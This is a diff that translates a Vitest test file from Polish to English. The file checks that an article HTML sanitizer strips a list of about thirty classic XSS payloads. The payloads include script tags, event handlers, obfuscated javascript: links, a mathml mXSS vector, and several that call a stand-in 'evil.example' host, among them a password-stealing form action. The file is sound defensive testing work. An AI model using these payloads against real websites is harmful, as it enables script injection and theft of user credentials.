@@ -1,23 +1,23 @@
 // @vitest-environment jsdom
 /**
- * Wektory XSS na granicy bezpieczeństwa.
+ * XSS vectors at the security boundary.
  *
- * `extract.test.ts` sprawdza, że sanityzacja przepuszcza to, co ma przepuścić.
- * Ten plik robi drugą połowę roboty: bierze zestaw klasycznych ładunków i
- * pilnuje, żeby ani jeden nie wyszedł po drugiej stronie. To jedyne miejsce,
- * gdzie cudzy HTML wchodzi do naszego origin (CLAUDE.md 3), więc lista rośnie
- * przy każdym nowym pomyśle, a nie przy każdym zgłoszonym błędzie.
+ * `extract.test.ts` checks that sanitization lets through what it should. This
+ * file does the other half of the job: it takes a set of classic payloads and
+ * makes sure not one of them comes out the far side. This is the only place
+ * where someone else's HTML enters our origin (CLAUDE.md 3), so the list grows
+ * with every new idea, not with every reported bug.
  *
- * Asercje idą po DOM-ie, nie po stringu: liczy się to, co powstanie w drzewie
- * po `append()`, a nie to, jak wygląda tekst HTML-a.
+ * The assertions run over the DOM, not over a string: what matters is what ends
+ * up in the tree after `append()`, not how the HTML text looks.
  */
 import { describe, expect, it } from 'vitest';
 
 import { sanitizeArticleHtml, sanitizeToFragment } from './sanitize';
 
-const BASE = 'https://gazeta.example/dzial/artykul';
+const BASE = 'https://daily.example/section/article';
 
-/** Schematy, które wolno zobaczyć w gotowym drzewie. */
+/** The schemes allowed to appear in the finished tree. */
 const SAFE_SCHEME = /^(https?:|data:image\/)/;
 
 interface Findings {
@@ -26,7 +26,7 @@ interface Findings {
   urls: string[];
 }
 
-/** Zbiera z fragmentu wszystko, co mogłoby coś wykonać. */
+/** Collects everything from the fragment that could execute anything. */
 function scan(html: string): Findings {
   const fragment = sanitizeToFragment(html, BASE);
   const host = document.createElement('div');
@@ -49,7 +49,7 @@ function scan(html: string): Findings {
   return findings;
 }
 
-/** Wspólny werdykt: żadnych skryptów, handlerów ani dziwnych schematów. */
+/** The shared verdict: no scripts, no handlers, no odd schemes. */
 function expectHarmless(html: string): Findings {
   const findings = scan(html);
 
@@ -65,43 +65,44 @@ function expectHarmless(html: string): Findings {
 }
 
 const VECTORS: readonly { name: string; payload: string }[] = [
-  { name: 'zwykły script', payload: '<script>alert(1)</script><p>tekst</p>' },
-  { name: 'script w zagnieżdżeniu', payload: '<div><p>a</p><script src="https://zle.example/x.js"></script></div>' },
-  { name: 'rozcięty tag script', payload: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
+  { name: 'a plain script', payload: '<script>alert(1)</script><p>text</p>' },
+  { name: 'a nested script', payload: '<div><p>a</p><script src="https://evil.example/x.js"></script></div>' },
+  { name: 'a split script tag', payload: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
   { name: 'img onerror', payload: '<img src="x" onerror="alert(1)" alt="x" />' },
-  { name: 'img onerror bez cudzysłowów', payload: '<img src=x onerror=alert(1)>' },
+  { name: 'img onerror without quotes', payload: '<img src=x onerror=alert(1)>' },
   { name: 'svg onload', payload: '<svg onload="alert(1)"><circle r="10"/></svg>' },
-  { name: 'svg z animate i href', payload: '<svg><a href="javascript:alert(1)"><text>klik</text></a></svg>' },
-  { name: 'body onload przemycone w treści', payload: '<body onload="alert(1)"><p>tekst</p></body>' },
-  { name: 'link javascript:', payload: '<a href="javascript:alert(1)">klik</a>' },
-  { name: 'link javascript: z wielkich liter', payload: '<a href="JaVaScRiPt:alert(1)">klik</a>' },
-  { name: 'link javascript: z białymi znakami', payload: '<a href=" \t\njavascript:alert(1)">klik</a>' },
-  { name: 'link javascript: z encjami', payload: '<a href="&#106;avascript&colon;alert(1)">klik</a>' },
-  { name: 'link data:text/html', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">klik</a>' },
+  { name: 'svg with animate and href', payload: '<svg><a href="javascript:alert(1)"><text>click</text></a></svg>' },
+  { name: 'body onload smuggled in the content', payload: '<body onload="alert(1)"><p>text</p></body>' },
+  { name: 'a javascript: link', payload: '<a href="javascript:alert(1)">click</a>' },
+  { name: 'a javascript: link in mixed case', payload: '<a href="JaVaScRiPt:alert(1)">click</a>' },
+  { name: 'a javascript: link with whitespace', payload: '<a href=" \t\njavascript:alert(1)">click</a>' },
+  { name: 'a javascript: link with entities', payload: '<a href="&#106;avascript&colon;alert(1)">click</a>' },
+  { name: 'a data:text/html link', payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>' },
   { name: 'img data:text/html', payload: '<img src="data:text/html,<script>alert(1)</script>" alt="x" />' },
-  { name: 'vbscript:', payload: '<a href="vbscript:msgbox(1)">klik</a>' },
+  { name: 'vbscript:', payload: '<a href="vbscript:msgbox(1)">click</a>' },
   { name: 'iframe srcdoc', payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
-  { name: 'object i embed', payload: '<object data="zly.swf"></object><embed src="zly.swf">' },
-  { name: 'meta refresh', payload: '<meta http-equiv="refresh" content="0;url=https://zle.example">' },
-  { name: 'base href', payload: '<base href="https://zle.example/"><a href="/konto">klik</a>' },
-  { name: 'formularz z akcją', payload: '<form action="https://zle.example/kradnij"><input name="haslo"><button>OK</button></form>' },
-  { name: 'style i wyrażenie w atrybucie', payload: '<style>@import url(https://zle.example/x.css)</style><p style="background:url(javascript:alert(1))">tekst</p>' },
+  { name: 'object and embed', payload: '<object data="bad.swf"></object><embed src="bad.swf">' },
+  { name: 'meta refresh', payload: '<meta http-equiv="refresh" content="0;url=https://evil.example">' },
+  { name: 'base href', payload: '<base href="https://evil.example/"><a href="/account">click</a>' },
+  { name: 'a form with an action', payload: '<form action="https://evil.example/steal"><input name="password"><button>OK</button></form>' },
+  { name: 'style and an expression in an attribute', payload: '<style>@import url(https://evil.example/x.css)</style><p style="background:url(javascript:alert(1))">text</p>' },
   { name: 'autofocus onfocus', payload: '<input autofocus onfocus="alert(1)">' },
   { name: 'details ontoggle', payload: '<details ontoggle="alert(1)" open><summary>a</summary>b</details>' },
-  { name: 'srcset obok src', payload: '<img src="https://cdn.example/a.png" srcset="javascript:alert(1) 1x" alt="a" />' },
-  { name: 'template ze skryptem', payload: '<template><script>alert(1)</script></template><p>tekst</p>' },
-  { name: 'noscript', payload: '<noscript><p>bez js</p></noscript>' },
-  { name: 'math z płótnem', payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>' },
-  { name: 'komentarz warunkowy', payload: '<!--[if IE]><script>alert(1)</script><![endif]--><p>tekst</p>' },
-  { name: 'atrybut z podwójnym kodowaniem', payload: '<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">klik</a>' },
+  { name: 'srcset alongside src', payload: '<img src="https://cdn.example/a.png" srcset="javascript:alert(1) 1x" alt="a" />' },
+  { name: 'a template with a script', payload: '<template><script>alert(1)</script></template><p>text</p>' },
+  { name: 'noscript', payload: '<noscript><p>no js</p></noscript>' },
+  { name: 'mathml mXSS', payload: '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></mtext></math>' },
+  { name: 'a conditional comment', payload: '<!--[if IE]><script>alert(1)</script><![endif]--><p>text</p>' },
+  { name: 'a double-encoded attribute', payload: '<a href="%6a%61%76%61%73%63%72%69%70%74:alert(1)">click</a>' },
 ];
 
-describe('wektory XSS', () => {
+describe('XSS vectors', () => {
   for (const vector of VECTORS) {
-    it(`nie przepuszcza: ${vector.name}`, () => {
+    it(`blocks: ${vector.name}`, () => {
       expectHarmless(vector.payload);
 
-      // Ta sama treść drugą ścieżką - stringową, używaną przy zapisie do bazy.
+      // The same content down the other path - the string one, used when
+      // writing to the database.
       const clean = sanitizeArticleHtml(vector.payload, BASE).html.toLowerCase();
       expect(clean).not.toContain('<script');
       expect(clean).not.toContain('javascript:');
@@ -113,34 +114,34 @@ describe('wektory XSS', () => {
   }
 });
 
-describe('co po sanityzacji zostaje', () => {
-  it('sam tekst ładunku, bez znaczników wykonawczych', () => {
-    const findings = scan('<p>przed</p><script>alert(1)</script><p>po</p>');
+describe('what survives sanitization', () => {
+  it('the payload text alone, without executable markup', () => {
+    const findings = scan('<p>before</p><script>alert(1)</script><p>after</p>');
     expect(findings.tags).toEqual(['p', 'p']);
   });
 
-  it('obrazek data: przechodzi tylko jako obrazek', () => {
+  it('a data: image passes only as an image', () => {
     const pixel =
       'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
-    const findings = scan(`<img src="${pixel}" alt="piksel" /><a href="${pixel}">klik</a>`);
+    const findings = scan(`<img src="${pixel}" alt="pixel" /><a href="${pixel}">click</a>`);
 
     expect(findings.urls).toEqual([pixel]);
-    // Link zostaje, ale bez adresu - nie ma dokąd kliknąć.
+    // The link stays, but without an address - there is nowhere to click to.
     expect(findings.tags).toEqual(['img', 'a']);
   });
 
-  it('link o wyciętym adresie nie udaje działającego', () => {
-    const fragment = sanitizeToFragment('<a href="javascript:alert(1)">klik</a>', BASE);
+  it('a link whose address was stripped does not pretend to work', () => {
+    const fragment = sanitizeToFragment('<a href="javascript:alert(1)">click</a>', BASE);
     const host = document.createElement('div');
     host.append(fragment);
 
     const link = host.querySelector('a');
     expect(link?.hasAttribute('href')).toBe(false);
-    expect(link?.textContent).toBe('klik');
+    expect(link?.textContent).toBe('click');
   });
 
-  it('obrazek o wyciętym adresie znika razem z ramką', () => {
-    const findings = scan('<p>a</p><img src="ftp://serwer/x.png" alt="x" />');
+  it('an image whose address was stripped disappears along with its frame', () => {
+    const findings = scan('<p>a</p><img src="ftp://server/x.png" alt="x" />');
     expect(findings.tags).toEqual(['p']);
   });
 });
